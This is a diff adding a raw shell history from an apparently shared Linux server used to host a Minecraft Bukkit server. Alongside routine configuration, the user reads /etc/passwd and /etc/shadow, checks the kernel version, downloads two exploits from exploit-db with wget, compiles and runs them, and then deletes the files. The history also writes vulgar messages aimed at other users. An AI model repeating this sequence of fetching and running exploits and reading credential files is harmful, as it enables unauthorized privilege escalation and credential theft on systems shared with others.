@@ -1,0 +1,191 @@
+ls
+echo "Morgan loves the cock" > README.txt
+ls
+exit
+ll
+cd ~
+ll
+cd ..
+ll
+cd evanc3/
+ll
+cp bukkit ~/
+cp -r bukkit ~/
+cd ..
+ll
+cd minecraft/
+ll
+cd bukkit/
+ll
+rm craftbukkit-dev.jar 
+rm -r future/
+cd plugins/
+ll
+exit
+ls
+sudo
+sudo su
+exit
+cd ..
+ll
+cd minecraft/
+ll
+rm -r bukkit/
+git clone https://github.com/morganhein/infomc.git bukkit
+cd bukkit/
+wget https://dl.dropboxusercontent.com/u/11780/server.properties
+cp -r ../../evanc3/bukkit/world* .
+ll
+nano .startserver.sh
+nano startserver.sh 
+nano ../../evanc3/bukkit/startserver.sh 
+nano startserver.sh 
+cd plugins/
+ll
+cd PermissionsEx/
+ll
+nano permissions.yml 
+cd ..
+screen ./startserver.sh 
+cd plugins/
+ll
+cd Simple\ Prefix/
+ll
+nano config.yml 
+exit
+ls
+cd bukkit
+ls
+message
+write "ashish fucked this shit up"
+write ashish fucked this shit up
+wall "this shit is fucked"
+cd /
+ls
+cd home/
+ls
+cd evanc3/
+ls
+cd ..
+ls
+screen -r
+cd bukkit/
+./startserver.sh 
+cd /var/www
+ls
+exit
+ls
+cd /
+ls
+cd et
+cd etc
+ls
+cd passwd
+cat passwd
+cat passwd-
+ls
+cat shadow
+cat shadow-
+atftpd
+man traceroute
+traceroute -h
+uname -r
+cd ~
+ls
+wget exploit-db.com/download/26131
+ls
+cat 26131 
+ls
+gcc 
+gcc 26131 -o lolhi
+mv 26131 ex.c
+gcc ex.c -o lolhi
+./lolhi
+ls
+cd bukkit/
+ls
+cd ..
+ls
+cd iuga
+ls
+cd ..
+ls
+cd iuga
+ls
+cd ..
+cd 
+ls
+cat README.txt 
+rm [^*.txt]
+rm ^(*.txt)
+ls
+rm -r bukkit/
+rm ex.c
+rm lohi
+ls
+rm lolhi 
+ls
+wget explot-db.com/exploits/25134 ex.c
+ls
+wget explot-db.com/exploits/25134
+wget exploit-db.com/exploits/25134
+ls
+mv 25134 ex.c
+gcc -o ex.c ex
+gcc ex.c -o ex
+ls
+gcc ex.c
+gcc ex.c -Wall ex
+gcc ex.c -Wall -i ex
+gcc ex.c -Wall -o ex
+;s
+ls
+gcc ex.c -o ex
+ls
+rm ex.c
+cd bukkit/
+ls
+cd creash
+cd ..
+ls
+exit
+ls
+cd bukkit/
+ls
+cd ../
+cd bukkit/
+ls
+cd crash-reports/
+ls
+cd ..
+ls
+cd ..
+ls
+nano README.txt 
+ls
+cd ../evanc3/
+ls
+cd bukkit/
+ls
+cd ..
+ls
+cd ..
+ls
+cd srt4
+ls
+cd ..
+cd minecraft/
+cd bukkit/
+ls
+tail -f /var/log/auth.log
+sudo tail -f /var/log/auth.log
+ls
+gedit ~/.config/user-dirs.dirs
+nano ~/.config/user-dirs.dirs
+cd ../
+ls
+screen -r
+cd bukkit
+ls
+ddrescue
+history -w ~/history.txt
